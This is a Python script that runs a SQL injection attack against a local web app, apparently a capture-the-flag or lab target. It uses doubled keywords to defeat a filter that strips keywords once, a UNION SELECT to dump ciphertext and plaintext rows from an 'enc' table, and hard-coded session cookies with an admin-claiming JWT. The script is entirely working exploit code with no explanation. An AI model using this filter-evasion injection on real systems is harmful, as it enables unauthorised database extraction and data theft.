import string
import requests
import urllib.request

for i in range(0,54):

    url = "http://127.0.0.1:8008/post?id=4%20ANANDD%201=1%20ununionion%20all%20selselectect%201,ciphertext,plaintext%20frfromom%20enc%20lilimitmit%20"+str(i)+",1"

    cookies = {"Cookie":"csrftoken=bdmPPre5zQyWxv1ryyVPajRcR6xvBukyWiCHLxxLRZxAa7eVtaiVPzgBmNLUWA5h; PHPSESSID=8dr5hkeasob07fd38p1ejvlhq0; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6dHJ1ZSwidXNlciI6ImFkbWluIiwiaGludCI6Im5vdGhpbmcgaGVyZSJ9.0PfeyUVvAFvevm4GDMMLidco89OHmwGIwkDl8vmM01M"}
    req = requests.get(url, cookies=cookies)
    req=str(req.text)
    startX=req.find('id=1">')+6
    endX = req.find('</a>')
    print(req[startX:endX])
    startP=req.find('</a></h3>')+9
    endP=req.find('<br /><br />')
    print(req[startP:endP])
    print()


